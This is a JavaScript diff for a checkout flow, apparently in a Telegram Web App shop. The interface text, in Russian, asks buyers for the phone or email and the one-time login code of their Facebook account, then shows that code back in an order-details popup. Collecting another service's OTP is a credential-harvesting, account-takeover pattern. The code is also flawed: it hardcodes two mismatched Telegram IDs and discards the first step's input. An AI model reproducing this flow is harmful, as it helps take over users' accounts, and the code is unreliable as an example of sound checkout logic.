@@ -1,111 +1,156 @@
 document.addEventListener("DOMContentLoaded", () => {
     const checkoutButton = document.getElementById("checkout-button");
-    const checkoutSteps = document.getElementById("checkout-steps");
-    const checkoutInstructions = document.getElementById("checkout-instructions");
-    const checkoutFields = document.getElementById("checkout-fields");
-    const checkoutNext = document.getElementById("checkout-next");
-    const checkoutSubmit = document.getElementById("checkout-submit");
 
-    let step = 0; // Текущий шаг оформления заказа
-    let orderData = {}; // Данные заказа
-
-    // Обработчик для кнопки "Оформить заказ"
-    checkoutButton.addEventListener("click", () => {
-        step = 1;
-        checkoutSteps.classList.remove("hidden");
-        checkoutInstructions.textContent =
-            "Пришлите телефон/электронную почту и одноразовый код доступа (OTP) от Facebook. Вы их можете найти в переписке в Telegram, если ранее делали заказ через человека. Если не делали или есть другие причины - напишите администратору.";
-        checkoutFields.innerHTML = `
-            <label>Телефон/Email:</label>
-            <input type="text" id="contact-info" required>
-            <label>OTP (одноразовый код):</label>
-            <input type="text" id="otp-code" required>
-        `;
-        checkoutNext.classList.remove("hidden");
-    });
-
-    // Обработчик для кнопки "Далее"
-    checkoutNext.addEventListener("click", () => {
-        if (step === 1) {
-            // Сохраняем данные шага 1
-            orderData.contactInfo = document.getElementById("contact-info").value;
-            orderData.otpCode = document.getElementById("otp-code").value;
-
-            // Проверяем, что поля заполнены
-            if (!orderData.contactInfo || !orderData.otpCode) {
-                alert("Заполните все поля!");
-                return;
+    checkoutButton.addEventListener("click", async () => {
+        // Выводим Telegram ID в консоль сервера, отправив его через fetch
+        if (window.userTelegramId) {
+            try {
+                const response = await fetch('/api/log_telegram_id', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ telegram_id: 11456241115 })
+                });
+                const data = await response.json();
+                console.log("Server response:", data);
+            } catch (err) {
+                console.error("Ошибка при отправке Telegram ID:", err);
             }
-
-            // Переход к шагу 2
-            step = 2;
-            checkoutInstructions.textContent = "Введите ссылку для связи в Telegram:";
-            checkoutFields.innerHTML = `
-                <label>Ссылка для связи:</label>
-                <input type="text" id="telegram-link" required>
-            `;
-        } else if (step === 2) {
-            // Сохраняем данные шага 2
-            orderData.telegramLink = document.getElementById("telegram-link").value;
-
-            // Проверяем, что поле заполнено
-            if (!orderData.telegramLink) {
-                alert("Введите ссылку для связи!");
-                return;
-            }
-
-            // Переход к шагу 3
-            step = 3;
-            checkoutInstructions.textContent = "Проверьте информацию о заказе:";
-            checkoutFields.innerHTML = `
-                <p>Контактная информация: ${orderData.contactInfo}</p>
-                <p>OTP: ${orderData.otpCode}</p>
-                <p>Ссылка для связи: ${orderData.telegramLink}</p>
-                <ul>
-                    ${generateCartHTML()} <!-- Подтягиваем товары из корзины -->
-                </ul>
-            `;
-            checkoutNext.classList.add("hidden");
-            checkoutSubmit.classList.remove("hidden");
+        } else {
+            console.error("Telegram ID не определён");
         }
+
+        // Закрываем окно корзины
+        const cartDropdown = document.querySelector('.cart-dropdown');
+        cartDropdown.classList.remove('active');
+
+        // Показываем всплывающее окно оформления заказа (первый шаг)
+        showOrderPopup();
     });
 
-    // Обработчик для кнопки "Оплатить"
-    checkoutSubmit.addEventListener("click", () => {
-        // Отправляем данные заказа на сервер
-        fetch("/api/checkout", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(orderData),
+    function showOrderPopup() {
+        const popup = document.createElement("div");
+        popup.classList.add("order-popup");
+        popup.innerHTML = `
+        <div class="order-popup-content">
+            <button class="order-popup-close">
+                <img src="/static/images/crest.png" alt="Закрыть">
+            </button>
+            <h2>Пришлите телефон/электронную почту и одноразовый код доступа (OTP) от Facebook.
+            Вы их можете найти в переписке в Telegram, если ранее делали заказ через человека. Если не делали или есть другие причины – напишите администратору.</h2>
+            <div class="order-input-container">
+                <input type="text" id="order-input" placeholder="Введите данные..." />
+            </div>
+            <button class="next-btn">
+                <img src="/static/images/next.png" alt="Далее">
+            </button>
+        </div>`;
+
+        document.body.appendChild(popup);
+
+        // Обработчик закрытия окна
+        popup.querySelector(".order-popup-close").addEventListener("click", () => {
+            popup.remove();
+        });
+
+        // Обработчик для кнопки "Далее" в первом окне
+        popup.querySelector(".next-btn").addEventListener("click", () => {
+            // Если нужно, можно сохранить данные первого шага:
+            // let otpData = document.getElementById("order-input").value;
+            popup.remove();
+            // Показываем второе окно для ввода ссылки Telegram
+            showTelegramPopup();
+        });
+    }
+
+    function showTelegramPopup() {
+        const popup = document.createElement("div");
+        popup.classList.add("order-popup");
+        popup.innerHTML = `
+        <div class="order-popup-content">
+            <button class="order-popup-close">
+                <img src="/static/images/crest.png" alt="Закрыть">
+            </button>
+            <h2>Введите ссылку для связи в Telegram:</h2>
+            <div class="order-input-container">
+                <input type="text" id="telegram-input" placeholder="Telegram ссылка" />
+            </div>
+            <button class="next-btn">
+                <img src="/static/images/next.png" alt="Далее">
+            </button>
+        </div>`;
+
+        document.body.appendChild(popup);
+
+        // Обработчик закрытия окна
+        popup.querySelector(".order-popup-close").addEventListener("click", () => {
+            popup.remove();
+        });
+
+        // Обработчик для кнопки "Далее" во втором окне
+        popup.querySelector(".next-btn").addEventListener("click", () => {
+            const telegramLink = document.getElementById("telegram-input").value.trim();
+            if (!telegramLink) {
+                alert("Введите ссылку для связи в Telegram!");
+                return;
+            }
+            alert("Ссылка для связи: " + telegramLink);
+            popup.remove();
+
+            // После ввода ссылки, запрашиваем с сервера последнюю запись заказа для текущего Telegram ID
+            fetchLatestOrder(1456241115);
+        });
+    }
+
+    function fetchLatestOrder(telegramId) {
+        fetch('/api/order/latest', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ telegram_id: telegramId })
         })
-            .then((response) => response.json())
-            .then((data) => {
-                if (data.success) {
-                    alert("Заказ успешно оформлен!");
-                    checkoutSteps.classList.add("hidden");
-                } else {
-                    alert("Ошибка оформления заказа: " + data.error);
-                }
-            })
-            .catch((error) => {
-                console.error("Ошибка:", error);
-            });
-    });
+        .then(response => {
+            if (!response.ok) {
+                throw new Error("Ошибка получения заказа");
+            }
+            return response.json();
+        })
+        .then(order => {
+            console.log("Полученный заказ:", order);
+            showOrderDetailsPopup(order);
+        })
+        .catch(error => {
+            console.error("Ошибка:", error);
+            alert("Не удалось получить данные заказа");
+        });
+    }
 
-    // Генерация товаров из корзины
-    function generateCartHTML() {
-        // Здесь вы должны получить данные корзины из вашей базы или API
-        // Пример:
-        const cart = [
-            { name: "Товар 1", quantity: 2, price: 500 },
-            { name: "Товар 2", quantity: 1, price: 1000 },
-        ];
+    function showOrderDetailsPopup(order) {
+        const popup = document.createElement("div");
+        popup.classList.add("order-popup");
+        popup.innerHTML = `
+        <div class="order-popup-content">
+            <button class="order-popup-close">
+                <img src="/static/images/crest.png" alt="Закрыть">
+            </button>
+            <h2>Детали заказа</h2>
+            <p><strong>Номер заказа:</strong> ${order.id}</p>
+            <p><strong>Telegram ID:</strong> ${order.user_id}</p>
+            <p><strong>Корзина:</strong> ${order.cart}</p>
+            <p><strong>OTP:</strong> ${order.otp_code}</p>
+            <p><strong>Telegram ссылка:</strong> ${order.telegram_link}</p>
+            <button class="confirm-btn">Подтверждаю</button>
+        </div>`;
 
-        return cart
-            .map(
-                (item) =>
-                    `<li>${item.name} x${item.quantity} - ${item.price * item.quantity} дублонов</li>`
-            )
-            .join("");
+        document.body.appendChild(popup);
+
+        popup.querySelector(".order-popup-close").addEventListener("click", () => {
+            popup.remove();
+        });
+
+        popup.querySelector(".confirm-btn").addEventListener("click", () => {
+            // Закрываем Telegram Web App
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.close();
+            }
+        });
     }
 });
